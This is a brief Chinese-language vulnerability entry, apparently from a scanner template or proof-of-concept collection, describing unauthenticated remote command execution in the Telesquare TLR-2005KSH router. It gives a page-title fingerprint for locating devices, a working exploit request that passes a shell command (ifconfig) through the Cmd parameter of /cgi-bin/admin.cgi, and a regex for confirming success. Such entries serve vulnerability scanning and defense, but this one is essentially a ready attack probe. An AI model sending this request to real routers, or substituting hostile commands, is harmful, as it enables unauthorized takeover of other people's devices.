# TelesquareTLR-2005KSH路由器未经授权的远程命令执行漏洞

TelesquareTLR ｜ 命令执行 ｜ —
- **指纹**：`title="Login to TLR-2005KSH"`
- **请求**：`GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1`
- **响应特征**：200 ^(?=.*?CmdResult)(?=.*?inet).*?$